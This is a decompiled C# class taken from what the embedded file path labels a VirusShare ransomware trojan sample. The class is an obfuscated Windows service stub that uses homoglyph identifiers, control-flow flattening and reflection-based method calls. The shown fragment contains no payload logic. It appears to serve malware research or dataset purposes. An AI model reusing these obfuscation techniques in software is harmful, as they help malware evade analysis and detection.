// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႤႭ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

namespace Ⴃ
{
  internal sealed class ႤႭ : ServiceBase
  {
    private IContainer Ⴃ;

    public ႤႭ() => this.Ⴈ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static byte[] Ⴗ()
    {
      Type type1 = typeof (ႳႤ.ႣႠ);
      Encoding encoding = ႥႥ.Ⴅ('ʒ', 'ʛ');
      Type type2 = typeof (Encoding);
      string name = ႷႨ.Ⴅ(ႭႭ.Ⴈ(typeof (ႳႼ), 3L, 4, 1951761649));
      object obj = (object) new Type[1];
      (obj as Type[])[0] = typeof (string);
      Type[] types = (Type[]) obj;
      // ISSUE: explicit non-virtual call
      MethodInfo method = __nonvirtual (type2.GetMethod(name, types));
      byte[] numArray = ((ႳႤ.ႣႠ) ႷႣ.Ⴓ<Type, MethodInfo, object>(type1, (object) encoding, method, '®', (short) 197))(ႣႭ.Ⴓ());
      ႣႣ.Ⴍ[161] = (byte) ((int) ႣႣ.Ⴍ[161] + (int) ႷႨ.Ⴐ[291] & 50);
      return numArray;
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      int num1 = 6;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_5;
          case 1:
          case 4:
            goto label_4;
          case 2:
            num1 = this.Ⴃ == null ? (int) ⴍ[195] - (int) ⴍ[33] : 4;
            continue;
          default:
            int num2 = obj0 ? 1 : 0;
            ႷႼ.Ⴗ[132] = (char) ((int) ႷႼ.Ⴗ[132] + (int) ႣႣ.Ⴍ[38] & 92);
            num1 = num2 == 0 ? (int) ⴍ[28] - 58 : 2;
            continue;
        }
      }
label_4:
      this.Ⴃ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴈ()
    {
      this.Ⴃ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076022930, (ႳႥ) null, 3, (Assembly) null), (short) 206, '¦');
    }

    static ႤႭ() => ႳႣ.Ⴅ();

    internal static void Ⴄ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00212 obj0,
      [In] \u0021\u00210 obj1,
      [In] \u0021\u00211 obj2,
      [In] short obj3,
      [In] int obj4)
      where \u0021\u00210 : string
      where \u0021\u00211 : object
      where \u0021\u00212 : AppDomain
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num1 = 7;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++num2;
            goto case 5;
          case 1:
            obj0.SetData((string) obj1, (object) obj2);
            goto case 0;
          case 2:
            goto label_13;
          case 3:
            num1 = (int) ⴐ[103];
            continue;
          case 4:
            num1 = num3 % 2 != 0 ? (int) ⴗ[167] - 60416 : 2;
            continue;
          case 5:
          case 8:
            int num4 = (int) obj3;
            int num5 = num4 * num4;
            num3 = (int) obj3 + num5;
            goto case 9;
          case 6:
            int num6;
            switch ((obj4 ^ (int) obj3) - 38 ^ num2)
            {
              case 0:
                num6 = (int) ⴍ[45];
                break;
              default:
                num6 = (int) ⴐ[440] - 132;
                break;
            }
            num1 = num6;
            continue;
          case 9:
            num1 = 4;
            continue;
          default:
            num2 = 0;
            num1 = 6;
            continue;
        }
      }
label_13:;
    }
  }
}
